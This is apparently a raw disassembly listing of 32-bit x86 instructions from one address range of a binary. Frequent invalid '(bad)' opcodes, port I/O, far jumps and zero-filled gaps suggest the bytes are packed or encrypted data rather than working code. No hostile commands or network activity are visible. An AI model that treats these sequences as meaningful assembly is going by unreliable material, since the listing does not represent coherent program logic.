  40e386:	or     ch,BYTE PTR [edx+0x63]
  40e389:	push   ss
  40e38a:	add    al,0xff
  40e38c:	push   esi
  40e38d:	in     eax,0x40
  40e38f:	inc    ecx
  40e390:	arpl   WORD PTR [edi-0x39],bp
  40e393:	addps  xmm5,XMMWORD PTR [edi+esi*2]
  40e397:	fisub  DWORD PTR gs:[eax+0x616f69fe]
  40e39e:	inc    esi
  40e39f:	lock xor eax,DWORD PTR [esi+esi*8-0x75]
  40e3a4:	int3   
  40e3a5:	inc    edx
  40e3a6:	ins    DWORD PTR es:[edi],dx
  40e3a7:	add    dh,dl
  40e3a9:	mov    al,ds:0xb8bc4ff2
  40e3ae:	(bad)  
  40e3af:	dec    BYTE PTR [esi-0x2b]
  40e3b2:	inc    eax
  40e3b3:	inc    ecx
  40e3b4:	arpl   WORD PTR [edi-0x39],bp
  40e3b7:	or     ebx,DWORD PTR [eax+0x2c]
  40e3ba:	jbe    0x40e3ef
  40e3bc:	out    dx,al
  40e3bd:	test   al,0xf2
  40e3bf:	add    BYTE PTR [eax],0x0
	...
  40e3ce:	add    BYTE PTR [ebx],bl
  40e3d0:	loopne 0x40e3d4
  40e3d2:	je     0x40e43c
  40e3d4:	ja     0x40e419
  40e3d6:	or     BYTE PTR [ebx],ah
  40e3d8:	pushf  
  40e3d9:	jmp    0x9b8a:0xfef2efb4
  40e3e0:	pop    eax
  40e3e1:	inc    esi
  40e3e2:	lock ins BYTE PTR es:[edi],dx
  40e3e4:	add    al,0x59
  40e3e6:	or     al,0x10
  40e3e8:	cli    
  40e3e9:	pop    eax
  40e3ea:	or     BYTE PTR [ebx-0x23],cl
  40e3ed:	call   DWORD PTR fs:[ebp+0x6c]
  40e3f1:	jmp    0x19368b86
  40e3f6:	jmp    FWORD PTR [edi+0xa]
  40e3f9:	inc    DWORD PTR [ebx+eiz*2-0x7c]
  40e3fd:	lods   al,BYTE PTR ds:[esi]
  40e3fe:	or     al,0xc9
  40e400:	push   es
  40e401:	scas   al,BYTE PTR es:[edi]
  40e402:	jns    0x40e433
  40e404:	stc    
  40e405:	sti    
  40e406:	adc    BYTE PTR [ebp+0x46],ah
  40e409:	jmp    0x624f0490
  40e40e:	ret    
  40e40f:	mov    ecx,0x630caace
  40e414:	push   edx
  40e415:	jb     0x40e407
  40e417:	add    eax,0x77feed73
  40e41c:	or     eax,0x384f1976
  40e421:	sub    BYTE PTR [eax+eiz*8],al
  40e424:	shl    eax,0x53
  40e427:	in     al,0x72
  40e429:	in     eax,dx
  40e42a:	(bad)  
  40e42b:	push   edi
  40e42c:	or     eax,0x38731956
  40e431:	test   al,0x3
	...
  40e43f:	add    BYTE PTR [eax],al
  40e441:	add    al,ah
  40e443:	shl    eax,0x8a
  40e446:	das    
  40e447:	adc    eax,0xce1b0270
  40e44c:	sub    dl,BYTE PTR [eax]
  40e44e:	arpl   WORD PTR [edx+0x62],dx
  40e451:	lock loope 0x40e415
  40e454:	adc    bh,bh
  40e456:	das    
  40e457:	or     DWORD PTR [ecx],edx
  40e459:	add    esi,edx
  40e45b:	clc    
  40e45c:	adc    eax,0xe572a30b
  40e461:	int3   
  40e462:	mov    ds:0xffee915,al
  40e467:	or     DWORD PTR [ecx],edx
  40e469:	loopne 0x40e439
  40e46b:	clc    
  40e46c:	push   ebp
  40e46e:	imul   eax,ebp,0xc69fe573
  40e474:	psubsw mm4,QWORD PTR [ebp+0x71]
  40e478:	adc    al,0xde
  40e47a:	fist   DWORD PTR ds:0xf863ace8
  40e480:	(bad)  
  40e481:	loop   0x40e4a3
  40e483:	jno    0x40e489
  40e485:	mov    al,0x22
  40e487:	or     BYTE PTR [eax],al
  40e489:	push   ecx
  40e48a:	cmp    BYTE PTR [bx+di-0x17],al
  40e48e:	enter  0x3d88,0x28
  40e492:	addr16 in eax,dx
  40e494:	mov    edi,DWORD PTR [edi+0x25]
  40e497:	test   DWORD PTR [edx],0x68089ba9
  40e49d:	jmp    0x1412af7
  40e4a2:	inc    esi
  40e4a3:	aaa    
  40e4a4:	inc    ecx
  40e4a5:	jmp    0x40e4aa
	...
  40e4b2:	add    BYTE PTR [eax],al
  40e4b4:	add    al,bh
  40e4b6:	jl     0x40e44e
  40e4b8:	jle    0x40e4b7
  40e4ba:	or     al,al
  40e4bc:	out    0xdc,al
  40e4be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e4bf:	add    cl,ch
  40e4c1:	pusha  
  40e4c2:	mov    al,BYTE PTR [ebp+eiz*2-0x70]
  40e4c6:	clc    
  40e4c7:	je     0x40e4b6
  40e4c9:	fst    QWORD PTR [eax]
  40e4cb:	add    BYTE PTR [esi],dl
  40e4cd:	push   ds
  40e4ce:	add    eax,0xc582583
  40e4d3:	shl    dh,0xdb
  40e4d6:	mov    es,WORD PTR [eax]
  40e4d8:	jmp    0x6441503d
  40e4dd:	sub    edi,ebp
  40e4df:	dec    edi
  40e4e0:	ret    
  40e4e1:	lods   eax,DWORD PTR ds:[esi]
  40e4e2:	pop    edi
  40e4e3:	nop
  40e4e4:	out    0x1f,al
  40e4e6:	add    eax,0xf69c94ff
  40e4eb:	adc    al,0xe1
  40e4ed:	push   ebp
  40e4ee:	inc    esi
  40e4ef:	add    BYTE PTR [edx-0x5c],ch
  40e4f2:	adc    ecx,DWORD PTR [ebx]
  40e4f4:	add    BYTE PTR [edx],bh
  40e4f6:	pop    es
  40e4f7:	test   DWORD PTR [edx-0x75],ebp
  40e4fa:	add    eax,DWORD PTR [eax]
  40e4fc:	push   edi
  40e4fe:	sti    
  40e4ff:	std    
  40e500:	adc    eax,0x41368e
  40e505:	stc    
  40e506:	int3   
  40e507:	add    al,BYTE PTR [ebx+0x5746e42]
  40e50d:	and    ebx,DWORD PTR [esi+0x1]
  40e510:	add    BYTE PTR [edx],bh
  40e512:	mov    BYTE PTR [ebx-0xc],al
  40e515:	push   0x6b
  40e517:	add    bh,bh
	...
  40e525:	add    BYTE PTR [eax],al
  40e527:	add    BYTE PTR [edi-0x7],dh
  40e52a:	out    0x14,al
  40e52c:	in     eax,dx
  40e52d:	clc    
  40e52e:	std    
  40e52f:	or     edi,edx
  40e531:	or     BYTE PTR [ecx+edi*1-0x7cfffcc5],al
  40e538:	jg     0x40e537
  40e53a:	dec    BYTE PTR [esi]
  40e53c:	xchg   BYTE PTR [eax],ch
  40e53e:	add    DWORD PTR [eax],eax
  40e540:	cli    
  40e541:	xor    BYTE PTR [esi],0x0
  40e544:	or     eax,0xa01247f
  40e549:	add    edx,DWORD PTR [eax-0x75]
  40e54c:	push   edi
  40e54d:	std    
  40e54e:	inc    eax
  40e54f:	push   edx
  40e550:	loop   0x40e5b9
  40e552:	mov    edi,edi
  40e554:	jge    0x40e5b1
  40e556:	mov    DWORD PTR [ebp+0x32],eax
  40e559:	clc    
  40e55a:	jae    0x40e550
  40e55c:	sub    eax,0x2252e86e
  40e561:	mov    cs,WORD PTR [ecx+0x43c01dff]
  40e567:	lock retf 0x2
  40e56b:	add    BYTE PTR [ebp-0x45ff13c2],al
  40e571:	add    al,BYTE PTR [eax]
  40e573:	cmp    DWORD PTR [edi-0x75bec0e6],0x2
  40e57a:	jne    0x40e5ce
  40e57c:	arpl   WORD PTR [ebp+eax*1-0x1513ddc0],ax
  40e583:	sub    DWORD PTR [edi],esp
  40e585:	in     al,dx
  40e586:	add    dl,BYTE PTR [eax+0xb]
  40e589:	loope  0x40e5cd
  40e58b:	inc    ecx
	...
  40e598:	add    BYTE PTR [eax],al
  40e59a:	add    BYTE PTR [ebx-0x11],ah
  40e59d:	jne    0x40e587
  40e59f:	jnp    0x40e5b9
  40e5a1:	pop    edi
  40e5a2:	add    BYTE PTR [ebx-0xd],ah
  40e5a5:	ret    0x7b73
  40e5a8:	push   esp
  40e5a9:	adc    BYTE PTR [eax-0x5e],al
  40e5ac:	in     al,dx
  40e5ad:	jmp    0xbb50:0x2ecaf0d
  40e5b4:	lock inc edx
  40e5b6:	inc    ecx
  40e5b7:	arpl   WORD PTR [edi+0x7c4be875],si
  40e5bd:	pop    esi
  40e5be:	add    BYTE PTR [ebx-0x1d],ah
  40e5c1:	ret    0x7173
  40e5c4:	adc    al,0x18
  40e5c6:	inc    eax
  40e5c7:	mov    ds:0xb8f1eaec,al
  40e5cc:	in     al,dx
  40e5cd:	add    dl,BYTE PTR [eax+0x7b]
  40e5d0:	lock inc edx
  40e5d2:	inc    ecx
  40e5d3:	arpl   WORD PTR [edi+0x75],di
  40e5d6:	call   0x9f35e6
  40e5db:	arpl   WORD PTR [ebx+0x2c4e681a],ax
  40e5e1:	inc    ebx
  40e5e2:	add    bl,bh
  40e5e4:	inc    ebx
  40e5e5:	pop    eax
  40e5e6:	add    BYTE PTR [ebx-0x44],ah
  40e5e9:	push   0x1d
  40e5eb:	and    ebp,DWORD PTR [ebp+0x4456ff02]
  40e5f1:	jmp    0x40e66c
  40e5f3:	es in  al,dx
  40e5f5:	add    cl,BYTE PTR [ebx]
  40e5f7:	mov    ds:0x1e8d6cb0,eax
  40e5fc:	cmp    BYTE PTR [ebx+0x6a],dl
	...
  40e60b:	add    BYTE PTR [eax],al
  40e60d:	add    BYTE PTR [edx+0x27],ah
  40e610:	jbe    0x40e60a
  40e612:	mov    ebx,0x9dfdb204
  40e617:	cmc    
  40e618:	sbb    eax,0x1548f76
  40e61d:	inc    esi
  40e61e:	mov    ?,ebp
  40e620:	or     eax,0x73f51f8a
  40e625:	inc    esi
  40e626:	ja     0x40e67c
  40e628:	xchg   ebx,eax
  40e629:	add    DWORD PTR [edi+ebp*2-0xf],esi
  40e62d:	jmp    0x6f65:0xfbedf733
  40e634:	fst    QWORD PTR [ebx+ecx*2+0x21]
  40e638:	fdiv   st(3),st
  40e63a:	push   ebp
  40e63b:	jg     0x40e668
  40e63d:	call   0x5025923
  40e642:	iret   
  40e643:	cmp    DWORD PTR [edx+0x79],ebp
  40e646:	dec    edi
  40e647:	push   es
  40e648:	xor    eax,0xe905cb2a
  40e64d:	jmp    0xf43b:0xc33f4ee
  40e654:	outs   dx,BYTE PTR ds:[esi]
  40e655:	sti    
  40e656:	sbb    eax,0x15ec13f5
  40e65b:	jnp    0x40e63e
  40e65d:	jmp    0x40e616
  40e65f:	mov    WORD PTR [ebp+0x797b05fb],cs
  40e665:	sti    
  40e666:	ja     0x40e665
  40e668:	nop
  40e669:	dec    esi
  40e66a:	fdivr  st(4),st
  40e66c:	jne    0x40e669
  40e66e:	ja     0x40e651
  40e670:	ins    DWORD PTR es:[edi],dx
  40e671:	jno    0x40e673
	...
  40e67f:	add    BYTE PTR [eax],al
  40e681:	pop    ebx
  40e682:	frstor ds:0x5df4dd83
  40e688:	jno    0x40e65d
  40e68a:	frstor [ebp+ecx*4+0x714df4cd]
  40e691:	mov    bh,0xdd
  40e693:	lods   al,BYTE PTR ds:[esi]
  40e694:	lea    edi,[ebp-0x348ec20c]
  40e69a:	(bad)  
  40e69c:	hlt    
  40e69d:	fdivrp st(3),st
  40e69f:	inc    BYTE PTR [eax-0x2f]
  40e6a2:	repnz (bad) 
  40e6a4:	es cwde 
  40e6a6:	jns    0x40e6a4
  40e6a8:	push   ds
  40e6a9:	jb     0x40e6b4
  40e6ab:	aas    
  40e6ac:	test   al,0x60
  40e6ae:	mov    bl,al
  40e6b0:	in     eax,0x78
  40e6b2:	fwait
  40e6b3:	sti    
  40e6b4:	push   es
  40e6b5:	js     0x40e674
  40e6b7:	rcr    ecx,0x60
  40e6ba:	pop    edx
  40e6bb:	mov    eax,DWORD PTR ds:0xee005f14
  40e6c1:	repz cld 
  40e6c3:	out    0x9a,eax
  40e6c5:	jmp    0x40e6b9
  40e6c7:	(bad)  
  40e6c8:	jb     0x40e702
  40e6ca:	push   edi
  40e6cb:	call   0x4694c9
  40e6d0:	loop   0x40e6f2
  40e6d2:	js     0x40e6ef
  40e6d4:	jmp    0x3be0:0xdbeb4c25
  40e6db:	or     eax,0x3785623d
  40e6e0:	jecxz  0x40e695
  40e6e2:	or     al,dh
  40e6e4:	jmp    0x40e6e9
	...
  40e6f1:	add    BYTE PTR [eax],al
  40e6f3:	add    BYTE PTR [eax-0x20],ah
  40e6f6:	add    DWORD PTR [edx-0x55c4c29d],edx
  40e6fc:	xchg   ebp,eax
  40e6fd:	fisttp WORD PTR [edx-0x3e415a56]
  40e703:	in     eax,dx
  40e704:	pusha  
  40e705:	pop    edx
  40e706:	mov    ecx,DWORD PTR [ebp+0x1eb3c7dd]
  40e70c:	call   0xb5c1f389
  40e711:	cmp    esi,0x74c56d66
  40e717:	in     al,0x39
  40e719:	mov    esi,0xf460f9c1
  40e71e:	je     0x40e6fd
  40e720:	mov    eax,0x2500ab86
  40e725:	out    dx,eax
  40e726:	or     eax,eax
  40e728:	out    dx,al
  40e729:	add    al,0x5f
  40e72b:	leave  
  40e72c:	js     0x40e746
  40e72e:	add    bh,bh
  40e730:	out    dx,eax
  40e731:	add    edi,edi
  40e733:	jne    0x40e6cf
  40e735:	fild   QWORD PTR [ecx-0x5]
  40e738:	jne    0x40e729
  40e73a:	mov    eax,DWORD PTR [ebp+0x6a]
  40e73d:	pop    eax
  40e73e:	push   DWORD PTR [ebp-0x5a]
  40e741:	fistp  QWORD PTR [edi]
  40e743:	(bad)  
  40e744:	gs out dx,eax
  40e746:	or     eax,eax
  40e748:	test   DWORD PTR [ebx-0x6],esi
  40e74b:	add    bh,BYTE PTR [edx+0x7]
  40e74e:	push   DWORD PTR [ebp+0x76]
  40e751:	in     eax,dx
  40e752:	jae    0x40e74c
  40e754:	xor    cl,ah
  40e756:	xchg   edx,eax
  40e757:	inc    DWORD PTR [eax]
	...
  40e765:	add    BYTE PTR [eax],al
  40e767:	xor    eax,0xbe0fc001
  40e76c:	int3   
  40e76d:	add    BYTE PTR [eax],al
  40e76f:	cmp    al,BYTE PTR [eax-0xe4e13bd]
  40e775:	jle    0x40e7b6
  40e777:	dec    edx
  40e778:	inc    BYTE PTR [ebx+0x738c9]
  40e77e:	push   edi
  40e77f:	and    al,BYTE PTR [ebx-0x1]
  40e782:	inc    ebp
  40e784:	jle    0x40e7c9
  40e786:	shl    ch,1
  40e788:	(bad)  
  40e789:	shr    BYTE PTR [eax+0x7e],1
  40e78c:	sub    al,0x41
  40e78e:	add    dl,ah
  40e790:	adc    bl,BYTE PTR [ebx+0x0]
  40e793:	or     dl,BYTE PTR [edi-0x1]
  40e796:	jne    0x40e772
  40e798:	popa   
  40e799:	mov    BYTE PTR [edi],bh
  40e79b:	cmp    ecx,DWORD PTR [ecx]
  40e79d:	call   0x4a38b9
  40e7a2:	push   eax
  40e7a3:	inc    ebp
  40e7a4:	(bad)  
  40e7a5:	shr    BYTE PTR [eax+0x46],1
  40e7a8:	sub    al,0x41
  40e7aa:	add    BYTE PTR [ebx+0x44],ah
  40e7ad:	or     ebx,DWORD PTR [ebx+0x63]
  40e7b0:	fcomp  QWORD PTR [ecx+ebx*2+0x68]
  40e7b4:	sbb    al,0x70
  40e7b6:	or     al,0x68
  40e7b8:	push   cs
  40e7b9:	jo     0x40e7c3
  40e7bb:	pop    eax
  40e7bc:	and    eax,0xde268509
  40e7c1:	add    al,BYTE PTR [eax]
  40e7c3:	push   0x9c096f35
  40e7c8:	test   eax,0xae
	...
  40e7d9:	add    BYTE PTR [ebx-0x24],ah
  40e7dc:	add    ch,bl
  40e7de:	pop    esp
  40e7df:	sub    edi,DWORD PTR [edi]
  40e7e1:	mov    ah,0x63
  40e7e3:	fadd   QWORD PTR [edx]
  40e7e5:	add    BYTE PTR [edi-0x51],dh
  40e7e8:	ret    0x6cb8
  40e7eb:	sti    
  40e7ec:	idiv   esi
  40e7ee:	jno    0x40e822
  40e7f0:	cmp    al,0x7
  40e7f2:	(bad)  
  40e7f3:	fdivr  QWORD PTR [edi+0x2dc4b44]
  40e7f9:	add    BYTE PTR [ebx+0x5c],ah
  40e7fc:	cmp    BYTE PTR [eax],al
  40e7fe:	push   esp
  40e7ff:	push   0xdc63024c
  40e804:	dec    edi
  40e805:	call   0xff389a1e
  40e80a:	fisub  DWORD PTR [eax]
  40e80c:	enter  0xa682,0xc4
  40e810:	add    dh,BYTE PTR [ebp+0x42]
  40e813:	adc    al,0x80
  40e815:	sub    esp,DWORD PTR [edx+0x1f74f7dc]
  40e81b:	test   BYTE PTR [ecx+0xbdc6359],ch
  40e821:	shr    BYTE PTR [ecx+eiz*2+0x6],0x2
  40e826:	arpl   sp,bx
  40e828:	mov    edi,0x2dcfb44
  40e82d:	add    BYTE PTR [ebx-0x7b],ah
  40e830:	add    DWORD PTR [edx],eax
  40e832:	arpl   WORD PTR ds:0xdd5784e9,ax
  40e838:	out    0x6e,eax
  40e83a:	pop    esp
  40e83b:	jl     0x40e810
  40e83d:	fild   WORD PTR [eax]
	...
  40e84b:	add    BYTE PTR [eax],al
  40e84d:	popf   
  40e84e:	inc    edi
  40e84f:	inc    ecx
  40e850:	add    eax,0xeae90563
  40e855:	out    dx,al
  40e856:	add    ebp,ecx
  40e858:	add    esp,eax
  40e85a:	outs   dx,DWORD PTR ds:[esi]
  40e85b:	inc    ecx
  40e85c:	add    eax,0x7660022e
  40e861:	or     ecx,0xffffffab
  40e864:	jmp    0x40e8c7
  40e866:	add    eax,0xa37a03e9
  40e86b:	out    0x3,eax
  40e86d:	arpl   WORD PTR [esi+0x7861eb8b],ax
  40e873:	test   BYTE PTR [edx+0x3e25d0f7],0x7b
  40e87a:	or     cl,ch
  40e87c:	add    esp,DWORD PTR [ebx-0x24]
  40e87f:	pop    esp
  40e880:	add    ah,BYTE PTR [ebx+0x5]
  40e883:	push   0x79
  40e885:	dec    ebx
  40e886:	or     dl,BYTE PTR [edi+eax*1-0x26]
  40e88a:	jb     0x40e83d
  40e88c:	mov    edi,0x3e3dd9f
  40e891:	arpl   WORD PTR ds:0x5626fd0,ax
  40e897:	jmp    0xec1e981e
  40e89c:	push   es
  40e89d:	fisub  WORD PTR [ebp-0x18]
  40e8a0:	add    esp,DWORD PTR [ebx+0x7e]
  40e8a3:	and    edx,eax
  40e8a5:	loope  0x40e919
  40e8a7:	push   ebp
  40e8a8:	add    al,0x97
  40e8aa:	(bad)  
  40e8ab:	lods   eax,DWORD PTR ds:[esi]
  40e8ac:	inc    ecx
  40e8ad:	sti    
  40e8ae:	add    ebp,ecx
  40e8b0:	add    eax,DWORD PTR [eax]
	...
  40e8be:	add    BYTE PTR [eax],al
  40e8c0:	arpl   sp,bx
  40e8c2:	in     eax,dx
  40e8c3:	mov    esi,0x3e6dd9f
  40e8c8:	arpl   WORD PTR ds:0xc5a2ae00,ax
  40e8ce:	(bad)  
  40e8cf:	call   0xad07ee34
  40e8d4:	test   al,0xf0
  40e8d6:	(bad)  
  40e8d7:	jmp    0x2d85b13c
  40e8dc:	pop    edi
  40e8dd:	add    eax,0x49fde900
  40e8e2:	mov    esp,0x560e9
  40e8e7:	and    ch,BYTE PTR es:[ebp+0x560e8ff]
  40e8ee:	push   DWORD PTR [esp+edi*4-0x73d8ed18]
  40e8f5:	out    dx,eax
  40e8f6:	mov    BYTE PTR [eax+eiz*4+0x773574ef],ah
  40e8fd:	or     dh,bh
  40e8ff:	push   cs
  40e900:	je     0x40e97f
  40e902:	inc    esp
  40e903:	xor    DWORD PTR [ecx+edi*2-0x2c],ebp
  40e907:	adc    DWORD PTR [edx-0xf],ebp
  40e90a:	(bad)  
  40e90b:	not    bh
  40e90d:	dec    ecx
  40e90e:	les    ebp,FWORD PTR [edx-0x66]
  40e911:	or     eax,0x55f283f
  40e916:	jne    0x40e953
  40e918:	mov    edi,0x5f28400a
  40e91d:	fisttp QWORD PTR [eax+esi*1]
  40e920:	addr16 add eax,0x5150
	...
  40e932:	add    BYTE PTR [edx+0x45],ah
  40e935:	inc    ecx
  40e936:	jmp    0xc2016270
  40e93b:	std    
  40e93c:	dec    ebp
  40e93d:	add    cl,ch
  40e93f:	imul   eax,ebp,0x1870173
  40e945:	inc    eax
  40e946:	sub    BYTE PTR [edi-0x23],ah
  40e949:	lock xor DWORD PTR [edi+0x5],ebx
  40e94d:	push   eax
  40e94e:	add    DWORD PTR [ebx+0x45],ebp
  40e951:	inc    ecx
  40e952:	add    BYTE PTR [edx],cl
  40e954:	div    DWORD PTR [ebx-0x40]
  40e957:	rcl    BYTE PTR [edx-0x505ffa8],cl
  40e95d:	mov    edi,0x145c1874
  40e962:	inc    eax
  40e963:	or     eax,DWORD PTR [eax+ebp*8]
  40e966:	aad    0xa2
  40e968:	add    eax,DWORD PTR [eax]
  40e96a:	push   eax
  40e96b:	mov    ds:0xca413fff,al
  40e970:	div    BYTE PTR [ebx-0x40]
  40e973:	adc    bl,BYTE PTR [edi+0x5a]
  40e976:	add    BYTE PTR [edx-0x7097e926],bh
  40e97c:	inc    ebx
  40e97d:	inc    ecx
  40e97e:	add    BYTE PTR [edx],ah
  40e980:	stos   DWORD PTR es:[edi],eax
  40e981:	push   esi
  40e982:	add    BYTE PTR [edx-0x45e297ad],cl
  40e988:	dec    eax
  40e989:	add    bh,bh
  40e98b:	out    0xc3,eax
  40e98d:	out    0x5d,al
  40e98f:	mov    al,0x3
  40e991:	add    BYTE PTR [ebx],cl
  40e993:	dec    edx
  40e994:	jne    0x40e9f8
  40e996:	inc    DWORD PTR [eax]
	...
  40e9a4:	add    BYTE PTR [eax],al
  40e9a6:	idiv   DWORD PTR [ebx+0x3d2a1e6]
  40e9ac:	add    BYTE PTR [eax+0x4d],dl
  40e9af:	pop    edi
  40e9b0:	enter  0x6ce8,0xeb
  40e9b4:	std    
  40e9b5:	call   ebx
  40e9b7:	cs mov esp,0xe6c5a7ff
  40e9bd:	lea    esi,[edx+0x9]
  40e9c0:	add    BYTE PTR [eax+0x1d],dl
  40e9c3:	pop    edi
  40e9c4:	(bad)  
  40e9c5:	call   0x3ed70a
  40e9ca:	ret    
  40e9cb:	cs mov eax,0xfec94f83
  40e9d1:	jae    0x40ea09
  40e9d3:	xchg   BYTE PTR [ebx-0x48],bh
  40e9d6:	cli    
  40e9d7:	pop    esi
  40e9d8:	cs push 0xef02dc63
  40e9de:	mov    ebp,0xb086e7f
  40e9e3:	call   0xc06f:0x6fecfe80
  40e9ea:	in     al,0xf1
  40e9ec:	or     ch,al
  40e9ee:	daa    
  40e9ef:	push   0xd1d4fef5
  40e9f4:	mov    dh,0xfe
  40e9f6:	push   esi
  40e9f7:	hlt    
  40e9f8:	jmp    0x36fe:0xf557df38
  40e9ff:	xchg   esp,eax
  40ea00:	hlt    
  40ea01:	je     0x40ea6e
  40ea03:	push   esp
  40ea04:	test   BYTE PTR es:[edi+ebp*1+0x74f5],ch
	...
  40ea18:	add    BYTE PTR [ebx-0x6378c6bc],ah
  40ea1e:	pop    ds
  40ea1f:	cmc    
  40ea20:	je     0x40e9cd
  40ea22:	adc    al,0x31
  40ea24:	xchg   DWORD PTR [edi+ecx*1+0x49f74f5],ecx
  40ea2b:	sub    DWORD PTR [edi+0x74f4ff7c],eax
  40ea31:	mov    bh,0x14
  40ea33:	and    DWORD PTR [edi+0x74f3ef6c],eax
  40ea39:	stos   DWORD PTR es:[edi],eax
  40ea3a:	add    al,0x19
  40ea3c:	xchg   DWORD PTR [edi+ebx*8-0x19],ebx
  40ea40:	or     al,0xe0
  40ea42:	push   0xe7d605ec
  40ea47:	mov    ebx,0x2da3b44
  40ea4c:	add    BYTE PTR [ebx+0x5b],ah
  40ea4f:	jbe    0x40ea39
  40ea51:	arpl   WORD PTR [eax],si
  40ea53:	xor    al,0x68
  40ea55:	out    0xff,eax
  40ea57:	inc    edx
  40ea58:	add    BYTE PTR [ecx+esi*1],ah
  40ea5b:	enter  0xd4e7,0x13
  40ea5f:	add    al,0x0
  40ea61:	push   0x646ea905
  40ea66:	(bad)  
  40ea67:	and    ebp,esp
  40ea69:	arpl   WORD PTR ds:0x48b03e9,ax
  40ea6f:	sub    DWORD PTR [ebx+0x63],eax
  40ea72:	out    dx,al
  40ea73:	sti    
  40ea74:	mov    DWORD PTR [esi+ecx*4],0xfa630420
  40ea7b:	test   al,0x6e
	...
  40ea89:	add    BYTE PTR [eax],al
  40ea8b:	add    BYTE PTR [esi+eax*8+0x23],ah
  40ea8f:	in     al,dx
  40ea90:	bound  eax,QWORD PTR ds:0x77cc03e9
  40ea96:	sub    eax,0x558696eb
  40ea9b:	hlt    
  40ea9c:	mov    eax,0xb5ba2931
  40eaa1:	in     eax,dx
  40eaa2:	inc    ebp
  40eaa3:	hlt    
  40eaa4:	mov    dl,0x9e
  40eaa6:	add    ch,bh
  40eaa8:	push   ebp
  40eaa9:	mov    BYTE PTR [esi+esi*8+0x6e2ded9d],al
  40eab0:	mov    bl,0xdc
  40eab2:	pop    esp
  40eab3:	jge    0x40ea42
  40eab5:	in     eax,dx
  40eab6:	sbb    eax,0x44dc776e
  40eabb:	jge    0x40eb3a
  40eabd:	in     eax,dx
  40eabe:	pop    ebx
  40eabf:	ds jae 0x40eb16
  40eac2:	adc    ecx,edx
  40eac4:	fsubr  st,st(5)
  40eac6:	std    
  40eac7:	jmp    0xbebd:0xf3f5ec55
  40eace:	sub    dl,BYTE PTR [ebx]
  40ead0:	arpl   WORD PTR [edx+0x72],dx
  40ead3:	loopne 0x40eab8
  40ead5:	rcl    DWORD PTR [edx+esi*8-0x765212bb],0xf4
  40eadd:	jmp    0x40eaac
  40eadf:	repz xor al,0xed
  40eae2:	call   0xd583c2ea
  40eae7:	(bad)  
  40eae8:	in     al,0x71
  40eaea:	add    ah,ch
  40eaec:	loopne 0x40eb22
  40eaee:	add    BYTE PTR [eax+eax*1],dh
	...
  40eafd:	add    BYTE PTR [eax],al
  40eaff:	push   0xffffffde
  40eb01:	hlt    
  40eb02:	call   0x153ff067
  40eb07:	imul   ebx,ebp,0x5d
  40eb0a:	js     0x40eafc
  40eb0c:	jmp    0x40eb18
  40eb0e:	test   eax,0x7067fc7a
  40eb13:	inc    ebx
  40eb14:	inc    esi
  40eb15:	add    BYTE PTR [esi+0x6a],bh
  40eb18:	adc    eax,ebp
  40eb1a:	jb     0x40eb7a
  40eb1c:	jmp    0x40eb1c
  40eb1e:	and    BYTE PTR [edx+0x5d],0x8e
  40eb22:	adc    eax,0xd4ff0526
  40eb27:	ins    BYTE PTR es:[edi],dx
  40eb28:	fucomp st(3)
  40eb2a:	pusha  
  40eb2b:	mov    al,0xeb
  40eb2d:	mov    BYTE PTR [edi+eax*1-0x15],ah
  40eb31:	inc    BYTE PTR [esi+0xf]
  40eb34:	sub    eax,DWORD PTR [ecx]
  40eb36:	jmp    0x2bc5659b
  40eb3b:	xchg   ecx,eax
  40eb3c:	jmp    0x40eb3c
  40eb3e:	cdq    
  40eb3f:	mov    eax,0x90268668
  40eb44:	jns    0x40eaca
  40eb46:	sub    edx,DWORD PTR [ecx+0x71b9feeb]
  40eb4c:	mov    cl,0xb7
  40eb4e:	pshufw mm5,mm3,0xe7
  40eb52:	dec    ecx
  40eb53:	or     BYTE PTR ds:0xb0da7000,al
  40eb59:	std    
  40eb5a:	not    BYTE PTR [ecx+0x2c]
  40eb5d:	pcmpgtw mm7,mm0
  40eb60:	add    al,0x0
  40eb62:	jmp    0x40eb67
	...
  40eb6f:	add    BYTE PTR [eax],al
  40eb71:	add    bl,ah
  40eb73:	nop
  40eb74:	rcr    edi,0x51
  40eb77:	jmp    0x40eb6f
  40eb79:	jmp    0x40ebcb
  40eb7b:	add    eax,0x8161e900
  40eb80:	add    BYTE PTR [eax],0x3a
  40eb83:	or     BYTE PTR [eax],al
  40eb85:	lea    edi,[eax+0x25]
  40eb88:	push   eax
  40eb89:	push   0x410c8e
  40eb8e:	and    bl,BYTE PTR [ecx+0x57]
  40eb91:	add    dl,bh
  40eb93:	jmp    0x147:0xc8ff75be
  40eb9a:	or     cl,BYTE PTR [eax]
  40eb9c:	lea    edx,[ebp-0x20a38]
  40eba2:	ja     0x40ebe6
  40eba4:	sub    al,0x50
  40eba6:	push   edx
  40eba7:	jg     0x40ebd3
  40eba9:	inc    ecx
  40ebaa:	retf   0x5acf
  40ebad:	push   edi
  40ebae:	retf   0xb07
  40ebb1:	shr    BYTE PTR [edi-0x44d31704],0x7
  40ebb8:	add    bh,bh
  40ebba:	lahf   
  40ebbb:	adc    ebp,eax
  40ebbd:	mov    edx,0xbfdf73a
  40ebc2:	jp     0x40ec31
  40ebc4:	punpckhbw mm0,QWORD PTR [edx+0x10]
  40ebc8:	inc    ecx
  40ebc9:	add    BYTE PTR [ebp+0x6d],dl
  40ebcc:	adc    al,0xe8
  40ebce:	in     eax,dx
  40ebcf:	push   0xea71fffe
  40ebd4:	push   0x0
	...
  40ebe5:	gs ins DWORD PTR es:[edi],dx
  40ebe7:	adc    al,0xe8
  40ebe9:	shr    DWORD PTR [eax-0x2],0xff
  40ebed:	pop    ss
  40ebee:	(bad)  
  40ebef:	sar    dh,0x65
  40ebf2:	test   DWORD PTR [ebx+0x50519652],0xfe69c5e8
  40ebfc:	(bad)  
  40ebfd:	cli    
  40ebfe:	push   esi
  40ebff:	push   DWORD PTR [ebp+0x4a]
  40ec02:	div    BYTE PTR [ebx+0xc]
  40ec05:	and    eax,0x63e80873
  40ec0a:	iret   
  40ec0b:	icebp  
  40ec0c:	(bad)  
  40ec0d:	xor    al,0xc5
  40ec0f:	mov    BYTE PTR [esp+ebp*1+0x63dcdac4],al
  40ec16:	fadd   QWORD PTR [edx]
  40ec18:	lea    esp,[ecx-0x307b8500]
  40ec1e:	call   0x4131:0x337bfef0
  40ec25:	arpl   WORD PTR [ebx-0x6c024c4a],cx
  40ec2b:	lock out 0x5e,eax
  40ec2e:	xor    al,0x4
  40ec30:	add    BYTE PTR [eax-0x64],bl
  40ec33:	ja     0x40ec63
